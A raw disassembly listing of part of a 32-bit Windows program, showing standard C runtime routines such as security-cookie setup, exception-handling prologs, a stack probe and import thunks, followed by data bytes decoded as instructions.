  411e73:	xor    DWORD PTR [ebp-0x4],eax
  411e76:	call   DWORD PTR ds:0x4140f4
  411e7c:	xor    DWORD PTR [ebp-0x4],eax
  411e7f:	call   DWORD PTR ds:0x4140ec
  411e85:	xor    eax,DWORD PTR [ebp-0x4]
  411e88:	lea    ecx,[ebp-0x4]
  411e8b:	xor    eax,ecx
  411e8d:	mov    DWORD PTR [ebp-0x4],eax
  411e90:	lea    eax,[ebp-0x14]
  411e93:	push   eax
  411e94:	call   DWORD PTR ds:0x4140f8
  411e9a:	mov    eax,DWORD PTR [ebp-0x10]
  411e9d:	xor    eax,DWORD PTR [ebp-0x14]
  411ea0:	mov    ecx,DWORD PTR [ebp-0x4]
  411ea3:	xor    ecx,eax
  411ea5:	cmp    ecx,edi
  411ea7:	je     0x411eb1
  411ea9:	test   DWORD PTR ds:0x413004,esi
  411eaf:	jne    0x411eb6
  411eb1:	mov    ecx,0xbb40e64f
  411eb6:	mov    DWORD PTR ds:0x413004,ecx
  411ebc:	not    ecx
  411ebe:	mov    DWORD PTR ds:0x413008,ecx
  411ec4:	pop    edi
  411ec5:	pop    esi
  411ec6:	mov    esp,ebp
  411ec8:	pop    ebp
  411ec9:	ret    
  411eca:	int3   
  411ecb:	int3   
  411ecc:	int3   
  411ecd:	int3   
  411ece:	int3   
  411ecf:	int3   
  411ed0:	xor    eax,eax
  411ed2:	ret    
  411ed3:	int3   
  411ed4:	int3   
  411ed5:	int3   
  411ed6:	int3   
  411ed7:	int3   
  411ed8:	push   0x30000
  411edd:	push   0x10000
  411ee2:	call   DWORD PTR ds:0x4141f4
  411ee8:	pop    ecx
  411ee9:	pop    ecx
  411eea:	ret    
  411eeb:	int3   
  411eec:	int3   
  411eed:	int3   
  411eee:	int3   
  411eef:	int3   
  411ef0:	jmp    DWORD PTR ds:0x414200
  411ef6:	int3   
  411ef7:	int3   
  411ef8:	int3   
  411ef9:	int3   
  411efa:	int3   
  411efb:	int3   
  411efc:	push   0x411f60
  411f01:	push   DWORD PTR fs:0x0
  411f08:	mov    eax,DWORD PTR [esp+0x10]
  411f0c:	mov    DWORD PTR [esp+0x10],ebp
  411f10:	lea    ebp,[esp+0x10]
  411f14:	sub    esp,eax
  411f16:	push   ebx
  411f17:	push   esi
  411f18:	push   edi
  411f19:	mov    eax,ds:0x413004
  411f1e:	xor    DWORD PTR [ebp-0x4],eax
  411f21:	xor    eax,ebp
  411f23:	mov    DWORD PTR [ebp-0x1c],eax
  411f26:	push   eax
  411f27:	mov    DWORD PTR [ebp-0x18],esp
  411f2a:	push   DWORD PTR [ebp-0x8]
  411f2d:	mov    eax,DWORD PTR [ebp-0x4]
  411f30:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  411f37:	mov    DWORD PTR [ebp-0x8],eax
  411f3a:	lea    eax,[ebp-0x10]
  411f3d:	mov    fs:0x0,eax
  411f43:	ret    
  411f44:	mov    ecx,DWORD PTR [ebp-0x1c]
  411f47:	xor    ecx,ebp
  411f49:	call   0x411980
  411f4e:	jmp    0x411fdd
  411f53:	int3   
  411f54:	int3   
  411f55:	int3   
  411f56:	int3   
  411f57:	int3   
  411f58:	int3   
  411f59:	int3   
  411f5a:	int3   
  411f5b:	int3   
  411f5c:	int3   
  411f5d:	int3   
  411f5e:	int3   
  411f5f:	int3   
  411f60:	mov    edi,edi
  411f62:	push   ebp
  411f63:	mov    ebp,esp
  411f65:	push   DWORD PTR [ebp+0x14]
  411f68:	push   DWORD PTR [ebp+0x10]
  411f6b:	push   DWORD PTR [ebp+0xc]
  411f6e:	push   DWORD PTR [ebp+0x8]
  411f71:	push   0x411980
  411f76:	push   0x413004
  411f7b:	call   0x411ff6
  411f80:	add    esp,0x18
  411f83:	pop    ebp
  411f84:	ret    
  411f85:	int3   
  411f86:	int3   
  411f87:	int3   
  411f88:	int3   
  411f89:	int3   
  411f8a:	int3   
  411f8b:	int3   
  411f8c:	int3   
  411f8d:	int3   
  411f8e:	int3   
  411f8f:	int3   
  411f90:	ret    
  411f91:	int3   
  411f92:	int3   
  411f93:	int3   
  411f94:	int3   
  411f95:	int3   
  411f96:	int3   
  411f97:	int3   
  411f98:	push   0x411f60
  411f9d:	push   DWORD PTR fs:0x0
  411fa4:	mov    eax,DWORD PTR [esp+0x10]
  411fa8:	mov    DWORD PTR [esp+0x10],ebp
  411fac:	lea    ebp,[esp+0x10]
  411fb0:	sub    esp,eax
  411fb2:	push   ebx
  411fb3:	push   esi
  411fb4:	push   edi
  411fb5:	mov    eax,ds:0x413004
  411fba:	xor    DWORD PTR [ebp-0x4],eax
  411fbd:	xor    eax,ebp
  411fbf:	push   eax
  411fc0:	mov    DWORD PTR [ebp-0x18],esp
  411fc3:	push   DWORD PTR [ebp-0x8]
  411fc6:	mov    eax,DWORD PTR [ebp-0x4]
  411fc9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  411fd0:	mov    DWORD PTR [ebp-0x8],eax
  411fd3:	lea    eax,[ebp-0x10]
  411fd6:	mov    fs:0x0,eax
  411fdc:	ret    
  411fdd:	mov    ecx,DWORD PTR [ebp-0x10]
  411fe0:	mov    DWORD PTR fs:0x0,ecx
  411fe7:	pop    ecx
  411fe8:	pop    edi
  411fe9:	pop    edi
  411fea:	pop    esi
  411feb:	pop    ebx
  411fec:	mov    esp,ebp
  411fee:	pop    ebp
  411fef:	push   ecx
  411ff0:	ret    
  411ff1:	int3   
  411ff2:	int3   
  411ff3:	int3   
  411ff4:	int3   
  411ff5:	int3   
  411ff6:	jmp    DWORD PTR ds:0x4141f0
  411ffc:	int3   
  411ffd:	int3   
  411ffe:	int3   
  411fff:	int3   
  412000:	int3   
  412001:	int3   
  412002:	int3   
  412003:	int3   
  412004:	int3   
  412005:	int3   
  412006:	int3   
  412007:	int3   
  412008:	int3   
  412009:	int3   
  41200a:	int3   
  41200b:	int3   
  41200c:	int3   
  41200d:	int3   
  41200e:	int3   
  41200f:	int3   
  412010:	jmp    DWORD PTR ds:0x4141b0
  412016:	int3   
  412017:	int3   
  412018:	int3   
  412019:	int3   
  41201a:	int3   
  41201b:	int3   
  41201c:	int3   
  41201d:	int3   
  41201e:	int3   
  41201f:	int3   
  412020:	jmp    DWORD PTR ds:0x4141bc
  412026:	int3   
  412027:	int3   
  412028:	int3   
  412029:	int3   
  41202a:	int3   
  41202b:	int3   
  41202c:	int3   
  41202d:	int3   
  41202e:	int3   
  41202f:	int3   
  412030:	push   ecx
  412031:	lea    ecx,[esp+0x4]
  412035:	sub    ecx,eax
  412037:	sbb    eax,eax
  412039:	not    eax
  41203b:	and    ecx,eax
  41203d:	mov    eax,esp
  41203f:	and    eax,0xfffff000
  412044:	cmp    ecx,eax
  412046:	jb     0x412052
  412048:	mov    eax,ecx
  41204a:	pop    ecx
  41204b:	xchg   esp,eax
  41204c:	mov    eax,DWORD PTR [eax]
  41204e:	mov    DWORD PTR [esp],eax
  412051:	ret    
  412052:	sub    eax,0x1000
  412057:	test   DWORD PTR [eax],eax
  412059:	jmp    0x412044
  41205b:	int3   
  41205c:	int3   
  41205d:	int3   
  41205e:	int3   
  41205f:	int3   
  412060:	jmp    DWORD PTR ds:0x41420c
  412066:	int3   
  412067:	int3   
  412068:	in     al,0xff
  41206a:	(bad)  
  41206b:	inc    DWORD PTR [eax]
  41206d:	add    BYTE PTR [eax],al
  41206f:	add    BYTE PTR [edi+edi*8+0xffff],al
  412076:	add    BYTE PTR [eax],al
  412078:	(bad)  
  412079:	(bad)  
  41207a:	(bad)  
  41207b:	dec    DWORD PTR [ecx+ebx*1]
  41207e:	inc    ecx
  41207f:	add    BYTE PTR [eax],dl
  412081:	sbb    DWORD PTR [ecx+0x0],eax
  412084:	(bad)  
  412085:	(bad)  
  412086:	(bad)  
  412087:	inc    eax
  412089:	sbb    BYTE PTR [ecx+0x0],al
  41208c:	aam    0x18
  41208e:	inc    ecx
  41208f:	add    dh,bh
  412091:	(bad)  
  412092:	(bad)  
  412093:	inc    DWORD PTR [eax]
  412095:	add    BYTE PTR [eax],al
  412097:	add    ah,dl
  412099:	(bad)  
  41209a:	(bad)  
  41209b:	inc    DWORD PTR [eax]
  41209d:	add    BYTE PTR [eax],al
  41209f:	add    dh,bh
  4120a1:	(bad)  
  4120a2:	(bad)  
  4120a3:	call   FWORD PTR [esp+ebx*1+0x41]
  4120a7:	add    BYTE PTR [eax+0x1c],ah
  4120aa:	inc    ecx
  4120ab:	add    BYTE PTR [eax],al
  4120ad:	add    BYTE PTR [eax],al
  4120af:	add    dh,bh
  4120b1:	(bad)  
  4120b2:	(bad)  
  4120b3:	inc    DWORD PTR [eax]
  4120b5:	add    BYTE PTR [eax],al
  4120b7:	add    al,bl
  4120b9:	(bad)  
  4120ba:	(bad)  
  4120bb:	inc    DWORD PTR [eax]
  4120bd:	add    BYTE PTR [eax],al
  4120bf:	add    dh,bh
  4120c1:	(bad)  
  4120c2:	(bad)  
  4120c3:	jmp    FWORD PTR [ebx-0x41ffbee3]
  4120c9:	.byte 0x1d
  4120ca:	inc    ecx
	...
